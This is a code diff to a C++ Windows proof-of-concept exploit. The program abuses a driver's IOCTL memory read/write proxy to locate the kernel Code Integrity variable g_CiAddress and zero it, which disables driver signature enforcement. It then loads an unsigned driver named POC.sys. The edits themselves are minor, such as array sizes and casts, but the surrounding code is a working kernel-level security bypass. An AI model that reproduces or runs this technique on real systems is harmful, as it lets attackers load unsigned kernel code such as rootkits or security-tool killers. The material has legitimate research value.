@@ -41,6 +41,7 @@ BOOL LoadDriver(LPCWSTR ServiceName, LPCWSTR DriverPath, DWORD StartType, BOOL D
 
 int main(int argc, WCHAR* argv[])
 {
+
 	BOOL Status = 1;
 	DWORD returned;
 	PRTL_PROCESS_MODULES ModuleInfo;
@@ -49,8 +50,8 @@ int main(int argc, WCHAR* argv[])
 	ReadWriteVirtualMemoryInfo WriteInfo{ 0 };
 	ReadWriteVirtualMemoryInfo ReadInfo{ 0 };
 
-	BYTE DisableValue_g_CiAddress[1] = { 0x00 };
-	BYTE OriginalValue_g_CiAddress[1] = { 0x00 };
+	BYTE DisableValue_g_CiAddress[2] = { 0x00 ,0x00};
+	BYTE OriginalValue_g_CiAddress[2] = { 0x00 ,0x00};
 	ULONG_PTR   g_CiAddress = 0;
 
 
@@ -66,7 +67,6 @@ int main(int argc, WCHAR* argv[])
 	SystemInformationptr.DataSize = 0;
 	SystemInformationptr.InformationClass = SystemModuleInformation;
 	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_QUERY_SYSTEM_INFORMATION, &SystemInformationptr, sizeof(QuerySystemInformationInfo), NULL, NULL, &returned, nullptr);
-
 
 	//allocate memory for module info
 	Allocate.BaseAddress = NULL;
@@ -119,7 +119,7 @@ int main(int argc, WCHAR* argv[])
 
 
 	ReadInfo.ProcessHandle = (HANDLE)GetCurrentProcess();
-	ReadInfo.Data = (unsigned char*)OriginalValue_g_CiAddress;
+	ReadInfo.Data = OriginalValue_g_CiAddress;
 	ReadInfo.BaseAddress = (PVOID)g_CiAddress;
 	ReadInfo.DataLen = 1;
 
@@ -129,11 +129,10 @@ int main(int argc, WCHAR* argv[])
 		return 0;
 	}
 
-
 	printf("[+] The Orginal Value of g_CiAddress is: 0x%x\n", OriginalValue_g_CiAddress[0]);
 
 	WriteInfo.ProcessHandle = GetCurrentProcess();
-	WriteInfo.Data = (unsigned char*)DisableValue_g_CiAddress;
+	WriteInfo.Data = DisableValue_g_CiAddress;
 	WriteInfo.BaseAddress = (PVOID)g_CiAddress;
 	WriteInfo.DataLen = 1;
 
@@ -144,6 +143,7 @@ int main(int argc, WCHAR* argv[])
 	}
 
 	printf("[+] Driver signing policy is Disabled\n");
+
 
 	// load driver here
 	if (!LoadDriver(TEXT("POCDriver"), TEXT("c:\\Users\\jony\\Desktop\\POC.sys"), SERVICE_DEMAND_START, TRUE)) {
